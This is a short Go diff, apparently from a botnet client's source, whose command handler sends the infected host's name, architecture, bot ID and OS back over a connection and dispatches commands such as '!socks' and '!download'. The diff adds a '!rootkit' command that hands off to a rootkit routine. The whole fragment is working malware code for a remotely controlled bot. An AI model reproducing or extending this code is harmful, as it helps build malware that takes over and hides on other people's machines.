@@ -77,6 +77,8 @@ func blackEnergy(conn net.Conn, command string) error {
 		arch := charmingKitten()
 		info := fmt.Sprintf("Hostname: %s\nArch: %s\nBotID: %s\nOS: %s\n", hostname, arch, mustangPanda(), runtime.GOOS)
 		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, info)))
+	case "!rootkit":
+		return dispatchRootkit(conn, cmd, fields)
 	case "!socks", "!stopsocks", "!socksauth":
 		return dispatchSocks(conn, cmd, fields)
 	case "!download":
